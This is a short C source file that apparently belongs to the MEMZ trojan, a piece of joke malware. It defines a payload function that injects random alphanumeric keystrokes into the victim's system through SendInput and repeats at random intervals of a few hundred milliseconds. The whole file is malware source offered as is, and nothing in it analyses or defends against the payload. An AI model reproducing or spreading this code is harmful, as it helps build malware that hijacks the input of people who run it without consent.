#include "../MEMZ.h"

PAYLOADFUNCTIONDEFAULT(payloadKeyboard) {
	PAYLOADHEAD
	
	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	out: return 300 + (random() % 400);
}